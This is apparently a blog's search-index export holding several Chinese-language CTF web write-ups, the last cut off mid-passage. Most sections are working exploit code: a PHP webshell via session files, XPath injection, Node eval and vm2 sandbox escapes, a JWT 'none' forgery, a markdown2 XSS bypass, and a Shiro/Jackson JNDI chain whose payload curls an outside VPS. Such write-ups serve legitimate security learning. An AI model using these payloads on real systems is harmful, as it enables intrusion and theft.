<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Ha1cyonCTF2020-部分writeup.md</title>
      <link href="/2020/04/21/ha1cyon-ctf2020-writeup/"/>
      <url>/2020/04/21/ha1cyon-ctf2020-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h2><pre><code>import requestssession = requests.session()burp0_url = "http://ha1cyon-ctf.fun:30135/msg.php"burp0_cookies = {"session": "acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I", "PHPSESSID": "4feut4nk0o5o37jjsg8173opk3"}burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://ha1cyon-ctf.fun:30135/index.bak.php?action=message.php", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}burp0_data = {"msg": "&lt;?PhP \n#"}session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)burp0_data = {"msg": "\neval($_GET[_]);#"}session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)burp0_data = {"msg": "\n ?&gt;"}session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)burp0_url = "http://ha1cyon-ctf.fun:30135/index.bak.php?action=/tmp/sess_4feut4nk0o5o37jjsg8173opk3&amp;_=print_r(scandir('/'));print_r(file_get_contents('/FIag_!S_it'));"r=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)print(r.text)</code></pre><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><pre><code>import requestsimport reurl='http://ha1cyon-ctf.fun:30163/'sess=requests.session()def token():    req=sess.get(url)    tok=re.findall('&lt;input type="hidden" id="token" value="(.*)" /&gt;',req.text)    return tok[0]def login(username,password):    data='''&lt;username&gt;{}&lt;/username&gt;&lt;password&gt;{}&lt;/password&gt;&lt;token&gt;{}&lt;/token&gt;'''.format(username,password,token())    req=sess.post(url+'login.php',data=data,headers = {'Content-Type': 'application/xml'})    print(req.text,req.status_code)    return req# rootpayload="' or  substring(name(/*[position()=1]),{},1)='{}'  or '1' = '1"ro='root'payload="' or substring(name(/root/*[position()=1]),{},1)='{}'  or '1' = '1"ro='accounts'payload="' or substring(name(/root/accounts/*[position()=1]),{},1)='{}'  or '1' = '1"ro='user'payload="' or substring(name(/root/accounts/user/*[position()=2]),{},1)='{}'  or '1' = '1"# id username passwordro=''payload="1' or substring(/root/accounts/user[id=2]/username,{},1)='{}' or '1'='1"# guest adm1nro=''payload="1' or substring(/root/accounts/user[id=2]/password,{},1)='{}' or '1'='1"#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123ro=''import stringfor i in range(1,100):    for j in string.digits+string.ascii_letters+'*':        if j=='*':            print('***************false')            break        tmp=payload.format(i,j)        req=login(tmp,'ad')        if '非法操作' in req.text:            ro+=j            print(ro)            break</code></pre><p><code>/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag</code></p><p>flag{95f4aaf6-ae61-47a6-affa-6d2811efbe0e}</p><h2 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h2><p>代码</p><pre><code>const express = require('express');const bodyParser = require('body-parser');const cookieSession = require('cookie-session');const fs = require('fs');const crypto = require('crypto');const keys = require('./key.js').keys;function md5(s) {  return crypto.createHash('md5')    .update(s)    .digest('hex');}function saferEval(str) {  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {    return null;  }  return eval(str);} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync('./index.html').toString();function render(results) {  return template.replace('{{results}}', results.join('&lt;br/&gt;'));}const app = express();app.use(bodyParser.urlencoded({ extended: false }));app.use(bodyParser.json());app.use(cookieSession({  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧  keys}));Object.freeze(Object);Object.freeze(Math);app.post('/', function (req, res) {  let result = '';  const results = req.session.results || [];  const { e, first, second } = req.body;  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {    if (req.body.e) {      try {        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';      } catch (e) {        console.log(e);        result = 'Wrong Wrong Wrong!!!';      }      results.unshift(`${req.body.e}=${result}`);    }  } else {    results.unshift('Not verified!');  }  if (results.length &gt; 13) {    results.pop();  }  req.session.results = results;  res.send(render(req.session.results));});// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get('/source', function (req, res) {  res.set('Content-Type', 'text/javascript;charset=utf-8');  res.send(fs.readFileSync('./index.js'));});app.get('/', function (req, res) {  res.set('Content-Type', 'text/html;charset=utf-8');  req.session.admin = req.session.admin || 0;  res.send(render(req.session.results = req.session.results || []))});app.listen(80, '0.0.0.0', () =&gt; {  console.log('Start listening')});</code></pre><pre><code>import reencode = lambda code: list(map(ord,code))decode = lambda code: "".join(map(chr,code))a=f"""(m0=&gt;(        m0=m0.constructor,        m0.x=m0.constructor(            m0.fromCharCode({encode("return process.mainModule.require('child_process').execSync('cat /flag')")})        )()    ))(Math+1)"""a=re.sub(r"[\s\[\]]", "", a).replace("m0","Math")print(a)</code></pre><pre><code>POST / HTTP/1.1Host: ha1cyon-ctf.fun:30300User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://ha1cyon-ctf.fun:30300/Content-Type: application/jsonContent-Length: 402Connection: closeCookie: session=acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I; PHPSESSID=4feut4nk0o5o37jjsg8173opk3; PHPSESSION=eyJhZG1pbiI6MCwicmVzdWx0cyI6W119; PHPSESSION.sig=Af7dna727rpLpx--lZVqoWD5BKUUpgrade-Insecure-Requests: 1{"e":"(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)","first":{"length":"1"},"second":{"length":"1"}}</code></pre><p>flag:</p><p>flag{8d82d5d6-741e-432a-be35-e43c23180b1a}</p><h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><pre><code>&lt;?phpclass HelloPhp{    public $a;    public $b;}$a=new HelloPhp();$a-&gt;b='call_user_func';$a-&gt;a='phpinfo';echo urlencode(serialize($a));?&gt;</code></pre><p><code>http://ha1cyon-ctf.fun:30089/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A1%3A%22b%22%3Bs%3A14%3A%22call_user_func%22%3B%7D</code></p><p>FLAG</p><p>flag{7b0e7129-48fa-44b7-a8d8-8e1ed7d4a21e} </p><h2 id="ezshiro"><a href="#ezshiro" class="headerlink" title="ezshiro"></a>ezshiro</h2><p>看到访问 <code>/json</code> 就跳到<code>/login</code>，</p><p>是一个比较新的<code>shiro</code>漏洞<code>CVE-2020-1957</code></p><p>可以通过<code>/;/json</code>的方式绕过直接访问</p><p><code>GET</code>访问是显示<code>Request method not support</code></p><p><code>POST a=1</code>访问，</p><p>看到<code>Unrecognized token  was expecting (&amp;#39;true&amp;#39;, &amp;#39;false&amp;#39; or &amp;#39;null&amp;#39;)</code></p><p>所以直接POST true，看到<code>jackson interface</code>， 所以是<code>jackson</code>反序列化</p><p>看一下<code>pom.xml</code>有什么</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;  &lt;parent&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;    &lt;version&gt;1.5.22.RELEASE&lt;/version&gt;    &lt;relativePath/&gt;  &lt;/parent&gt;  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;  &lt;artifactId&gt;shiro-test&lt;/artifactId&gt;  &lt;build&gt;    &lt;plugins&gt;      &lt;plugin&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;        &lt;configuration&gt;          &lt;fork&gt;true&lt;/fork&gt;          &lt;mainClass&gt;com.lfy.ctf.Application&lt;/mainClass&gt;        &lt;/configuration&gt;        &lt;executions&gt;          &lt;execution&gt;            &lt;goals&gt;              &lt;goal&gt;repackage&lt;/goal&gt;            &lt;/goals&gt;          &lt;/execution&gt;        &lt;/executions&gt;      &lt;/plugin&gt;    &lt;/plugins&gt;  &lt;/build&gt;  &lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;      &lt;version&gt;1.5.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;      &lt;version&gt;1.5.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;      &lt;artifactId&gt;logback-core&lt;/artifactId&gt;      &lt;version&gt;1.2.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.2.1&lt;/version&gt;    &lt;/dependency&gt;  &lt;/dependencies&gt;&lt;/project&gt;</code></pre><p>有<code>ch.qos.logback</code>和<code>commons-collections</code>，</p><p>然后看一下<code>jackson</code>有什么漏洞，根据<code>pom.xml</code>来看，直接筛选，看到有一个<code>logback</code>的</p><p><strong>CVE-2019-14439</strong>可以 </p><p>利用是</p><p><code>["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://localhost:43658/Calc"}]</code></p><p>那么是JNDI注入</p><p>然后题目是高版本的JDK，&gt; 8u191,</p><p><code>paper</code>上有绕过高版本的JDK限制进行JNDI注入</p><p><a href="https://paper.seebug.org/942/#ldapgadget" target="_blank" rel="noopener">https://paper.seebug.org/942/#ldapgadget</a></p><p>结合<code>pom.xml</code>的<code>commons-collections</code>,</p><p>就是利用LDAP返回序列化数据，触发本地Gadget，就是用Common Collections的了</p><p>本来想用这个的文章的代码，<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java" target="_blank" rel="noopener">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java</a></p><p>没实践过高版本的，只试过低版本的,不过随便翻翻其他的看到了可以更简单的</p><p><code>ysomap</code>这个工具，在本地直接内网穿透</p><pre><code>java -jar ysomap-cli-0.0.1-SNAPSHOT-all.jaruse exploit LDAPLocalChainListeneruse payload  CommonsCollections8use bullet TransformerBulletset lport 5555set version 3set args 'curl xx.xx.xx.xxx/try/shell.php?a=test'</code></pre><p><img src="../../../../../../../images/ha1cyon/ysomap.png" alt=""></p><p>vps shell.php 内容是</p><pre><code>&lt;?php$a=$_GET['a'];file_put_contents('content',$a);</code></pre><p>然后json发送</p><pre><code>["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://mu27062382.zicp.vip:18330/hhhhhh"}]</code></pre><p><img src="../../../../../../../images/ha1cyon/burp2.png" alt=""></p><p>虽然是报错返回500,但是其实是执行了的，在vps上可以看到效果</p><p><img src="../../../../../../../images/ha1cyon/vps.png" alt=""></p><p>成功执行命令，RCE</p><p>flag</p><p>flag{ebcfc7fa-d9e7-4db1-9685-42684bc1aa76}</p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><pre><code>import requestsimport hashpumpyimport urlliburl='http://ha1cyon-ctf.fun:30004/flflflflag.php?file=/tmp/sess_hass13s37'for i in range(40):    a,b=hashpumpy.hashpump('a3dabbc779f2fbf8b6f56113ca78a7f9','123444','1',i)    req=requests.get(url+"name={}&amp;pass={}".format(urllib.parse.quote(b),a))    if 'username/password error' not in req.text:        print(req.text,url+"name={}&amp;pass={}".format(urllib.parse.quote(b),a))</code></pre><p>flag:</p><p>flag{6b671cf1-9558-47f6-9cd2-46ff8e32a3e9}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hfctf2020部分writeup</title>
      <link href="/2020/04/19/hfctf2020-bu-fen-writeup/"/>
      <url>/2020/04/19/hfctf2020-bu-fen-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>都是知道的知识点，但是总是觉得是自己不会的知识点，</p><p>看都没怎么看就疯狂谷歌</p><h2 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h2><p>node的题目,扫描看到<code>package.json</code>和<code>app.js</code></p><p>根据<code>require</code>的情况看代码</p><p>api的代码<code>controllers/api.js</code></p><pre><code>const crypto = require('crypto');const fs = require('fs')const jwt = require('jsonwebtoken')const APIError = require('../rest').APIError;module.exports = {    'POST /api/register': async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || username === 'admin'){            throw new APIError('register error', 'wrong username');        }        if(global.secrets.length &gt; 100000) {            global.secrets = [];        }        const secret = crypto.randomBytes(18).toString('hex');        const secretid = global.secrets.length;        global.secrets.push(secret)        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});        ctx.rest({            token: token        });        await next();    },    'POST /api/login': async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || !password) {            throw new APIError('login error', 'username or password is necessary');        }        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError('login error', 'no such secret id');        }        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, {algorithm: 'HS256'});        const status = username === user.username &amp;&amp; password === user.password;        if(status) {            ctx.session.username = username;        }        ctx.rest({            status        });        await next();    },    'GET /api/flag': async (ctx, next) =&gt; {        if(ctx.session.username !== 'admin'){            throw new APIError('permission error', 'permission denied');        }        const flag = fs.readFileSync('/flag').toString();        ctx.rest({            flag        });        await next();    },    'GET /api/logout': async (ctx, next) =&gt; {        ctx.session.username = null;        ctx.rest({            status: true        })        await next();    }};</code></pre><p>关键是</p><pre><code> const secret = global.secrets[sid];        const user = jwt.verify(token, secret, {algorithm: 'HS256'});        const status = username === user.username &amp;&amp; password === user.password;</code></pre><p>这里用了 <code>jsonwebtoken</code></p><p><code>evoa</code>师傅在<code>unctf</code> 出了题目，是关于<code>jsonwebtoken</code>的缺陷的</p><p>使<code>secretid</code>是不存在的，然后伪造</p><pre><code>import jwttoken = jwt.encode({"secretid":"","username":"admin","password":"admin","iat":1587324787},algorithm="none",key="").decode(encoding='utf-8')print(token)#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IiIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3MzI0Nzg3fQ.</code></pre><p>然后post</p><pre><code>POST /api/login HTTP/1.1username=admin&amp;password=admin&amp;authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IiIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3MzI0Nzg3fQ.</code></pre><p>登录获取<code>cookie</code></p><p>带上这两个<code>cookie</code>然后访问<code>/api/flag</code>获取flag</p><h2 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h2><p>看起来是<code>php</code>，实际上是<code>node</code>，</p><p>在<code>run.php?code=1-1</code> 可以执行代码</p><p>一看名字叫<code>escape</code>就知道又是<code>vm2</code>逃逸了</p><p>过滤了一些东西大概是</p><pre><code>'"+processexecconstructorfor</code></pre><p>这个可以绕过</p><p>用这个方式</p><pre><code>try { require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`) } catch(e){}</code></pre><p>那么只要找<code>issues</code>就可以了</p><p>最新的不行逃逸，卡了很多时间，无语了</p><p><a href="https://github.com/patriksimek/vm2/issues/268" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/268</a></p><p>用历史的，<code>2019</code>的可以了</p><p><a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a></p><pre><code>import requestsa='''(function(){    try { require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`) } catch(e){}    let buffer = {        hexSlice: () =&gt; ``,        magic: {            get [Symbol[`f\\u006fr`](`n\\u006fdejs.util.inspect.cust\\u006fm`)](){                throw f =&gt; f[`c\\u006fnstruct\\u006fr`](`return pr\\u006fcess`)();            }        }    };    try{        Buffer[`pr\\u006ftotype`][`inspect`][`call`](buffer, 0, { customInspect: true });    }catch(e){        e(()=&gt;0).mainModule.require(`child_pr\\u006fcess`)[`\\u0065xecSync`](`ls`)    }})()'''a='''(function(){    TypeError[`prot\\u006ftype`][`get_pr\\u006fcess`] = f=&gt;f[`c\\u006fnstructor`](`return pr\\u006fcess`)();    try{        Object.preventExtensions(Buffer.from(``)).a = 1;    }catch(e){        return e[`get_pr\\u006fcess`](()=&gt;{}).mainModule[`require`](`child_pr\\u006fcess`)[`\\u0065xecSync`](`cat /flag`).toString();    }})()'''url='http://ca8b55804ed648d3a6e6bad8e66e5f6fd0e8b9cfec904ad7.changame.ichunqiu.com/run.php'param={'code':a}req=requests.get(url=url,params=param)print(req.text)</code></pre><p>打不过打不过，明天去<code>Ha1cyonCTF</code>玩了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WPICTF-2020-部分writeup</title>
      <link href="/2020/04/18/wpictf2020-bu-fen-writeup/"/>
      <url>/2020/04/18/wpictf2020-bu-fen-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前几题还是简单的</p><h2 id="👉👉👉第一题😎👉"><a href="#👉👉👉第一题😎👉" class="headerlink" title="👉👉👉第一题😎👉"></a>👉👉👉第一题😎👉</h2><p><img src="../../../../../../../images/WPICTF2020/123.png" alt=""></p><h2 id="第二题-dorsia2"><a href="#第二题-dorsia2" class="headerlink" title="第二题 dorsia2"></a>第二题 dorsia2</h2><p>描述</p><pre><code>http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The second card.http://dorsia2.wpictf.xyz:31337/index.html or 31338 or 31339Firefox doesnt like the page... try chromium.made by: awgHint: flag in ~/flag.txt</code></pre><p>虽然这题很简单，不过给代码的方式很有趣</p><p><img src="../../../../../../../images/WPICTF2020/code-dorsia2.png" alt=""></p><p><img src="../../../../../../../images/WPICTF2020/dorsia2-etc-passwd.png" alt=""></p><p>最后</p><p><img src="../../../../../../../images/WPICTF2020/dorsia2.png" alt=""></p><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>是一个 c的编译器</p><p>通过报错包含得到</p><p><img src="../../../../../../../images/WPICTF2020/autograder.png" alt=""></p><h2 id="Suckmore-Shell2-0-linux"><a href="#Suckmore-Shell2-0-linux" class="headerlink" title="Suckmore Shell2.0 (linux)"></a>Suckmore Shell2.0 (linux)</h2><p>linux 的题目，看到一个很多人做的去混一下</p><p><img src="../../../../../../../images/WPICTF2020/Suckmore-Shell-2.0.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteBandits CTF 2020部分writeup-notesapp</title>
      <link href="/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/"/>
      <url>/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>吃了不会前端的大亏，下午的时候一度要做出来了，思路完全对了</p><p>编写利用过程失败了，最后就差<code>js</code>获取<code>iframe</code>内容那么一点卡住了很久，最后改了几个字符就成功了</p><p>网上一搜一页基本上都是复制粘帖的，果然不能总靠临时学习，吐了</p><p>这次比赛过后下定决心好好学一下<code>js</code></p><h2 id="源代码和大概内容"><a href="#源代码和大概内容" class="headerlink" title="源代码和大概内容"></a>源代码和大概内容</h2><p><strong>main.py</strong></p><pre><code>import osfrom flask import Flask, render_template, request, flash, redirectfrom flask_sqlalchemy import SQLAlchemyfrom flask_login import LoginManagerfrom flask_login import login_required, logout_user, current_user, login_userimport markdown2import requestsfrom .models import Userfrom . import db, create_app, login_managerfrom .visit_link import q, visit_urlapp = create_app()# configure login_manager {{{1 #@login_manager.user_loaderdef load_user(user_id):    """Check if user is logged-in on every page load."""    if user_id is not None:        return User.query.get(user_id)    return None@login_manager.unauthorized_handlerdef unauthorized():    """Redirect unauthorized users to Login page."""    flash('You must be logged in to view that page.')    return redirect("/login")# 1}}} ## configure routes {{{1 #@app.route("/")def index():    if current_user.is_authenticated:        return redirect("/profile")    return render_template("index.html")@app.route("/register", methods = ["GET", "POST"])def register():    if current_user.is_authenticated:        return redirect("/profile")    if request.method == 'POST':        # register user        id = request.form.get('username')        password = request.form.get('password')        existing_user = User.query.filter_by(id = id).first()  # Check if user exists        if existing_user is None:            user = User(id = id)            user.set_password(password)            user.notes = ""            db.session.add(user)            db.session.commit()  # Create new user            login_user(user)  # Log in as newly created user            return redirect("/profile")        flash('A user already exists with that name already exists.')        return redirect("/register")    return render_template("register.html")@app.route("/login", methods = ["GET", "POST"])def login():    if current_user.is_authenticated:        return redirect("/profile")    if request.args.get("username"):        # register user        id = request.args.get('username')        password = request.args.get('password')        user = User.query.filter_by(id = id).first()        if user and user.check_password(password = password):            login_user(user)            return redirect("/profile")        flash('Incorrect creds')        return redirect("/login")    return render_template("login.html")@app.route("/visit_link", methods=["GET", "POST"])def visit_link():    if request.method == "POST":        url = request.form.get("url")        token = request.form.get("g-recaptcha-response")        r = requests.post("https://www.google.com/recaptcha/api/siteverify", data = {            'secret': os.environ.get('RECAPTCHA_SECRET'),            'response': token        })        if r.json()['success']:            job = q.enqueue(visit_url, url, result_ttl = 600)            flash("Our admin will visit the url soon.")            return render_template("visit_link.html", job_id = job.id)        else:            flash("Recaptcha verification failed")    return render_template("visit_link.html")@app.route("/status")def status():    job_id = request.args.get('job_id')    job = q.fetch_job(job_id)    status = job.get_status()    return render_template("status.html", status = status)@app.route("/profile")@login_requireddef profile():    return render_template("profile.html", current_user = current_user)@app.route("/update_notes", methods=["POST"])@login_requireddef update_notes():    # markdown support!!    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)    db.session.commit()    return redirect("/profile")@app.route("/logout")@login_requireddef logout():    logout_user()    return redirect("/")# 1}}} #</code></pre><p>是一个<code>xss</code>挑战，提交<code>url</code>可以让<code>admin</code>去访问</p><p>而 <code>visit_link.py</code>的部分内容是这样</p><pre><code>async def main(url):    browser = await launch(headless=True,                           executablePath="/usr/bin/chromium-browser",                           args=['--no-sandbox', '--disable-gpu'])    page = await browser.newPage()    await page.goto("https://notes.web.byteband.it/login")    await page.type("input[name='username']", "admin")    await page.type("input[name='password']", os.environ.get("ADMIN_PASS"))    await asyncio.wait([        page.click('button'),        page.waitForNavigation(),    ])    await page.goto(url)    await browser.close()def visit_url(url):    asyncio.get_event_loop().run_until_complete(main(url))</code></pre><p>打开<code>chrome</code>浏览器然后登录<code>admin</code>后访问提交的页面</p><p>然后看到 <code>main.py</code></p><pre><code>@app.route("/update_notes", methods=["POST"])@login_requireddef update_notes():    # markdown support!!    current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True)    db.session.commit()    return redirect("/profile")</code></pre><p>授权登录后可以编辑<code>notes</code>,使用<code>markdown2</code></p><p>看到<code>github</code>上的<code>issues</code></p><p><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a></p><p>可以绕过造成 <code>xss</code></p><pre><code>&gt;&gt;&gt; import markdown2&gt;&gt;&gt; markdown2.markdown('&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;alert(1);/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;', safe_mode=True)'&lt;p&gt;&lt;http://g&lt;!s://q?&lt;!-&amp;lt;&lt;a href="http://g"&gt;&lt;script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&amp;lt;&lt;a href="http://g"&gt;a\\*/&lt;/script&gt;alert(1);/*&lt;/a&gt;-&gt;a&gt;&lt;/p&gt;\n'&gt;&gt;&gt; </code></pre><p>所以这是个 <code>authenticated XSS</code>，需要登录才可以利用</p><p>在<code>login</code>内容</p><pre><code>@app.route("/login", methods = ["GET", "POST"])def login():    if current_user.is_authenticated:        return redirect("/profile")。。。。        id = request.args.get('username')        password = request.args.get('password')</code></pre><p>可以看到用的是 <code>request.args.get</code></p><p>也就是可以使用 <code>GET</code>来登录，</p><p>而<code>flag</code>在<code>admin_user.notes = os.environ.get("FLAG")</code></p><p>也就是<code>admin</code>页面的<code>notes</code>就是<code>flag</code>了</p><p>所以只要利用<code>xss</code>获取那个页面内容就可以了</p><p>至于<code>盗取cookie</code>的话，因为<code>cookie</code>使用了 <code>httponly</code></p><p>无法通过<code>js</code>来访问，加上这样的利用条件应该无法盗用了</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>如果已经登录了，浏览器拥有那个<code>cookie</code>，然后有一个<code>iframe</code>，那么<code>iframe</code>可以获取那个<code>cookie</code></p><p><a href="https://www.chromium.org/updates/same-site" target="_blank" rel="noopener">chromium same-site 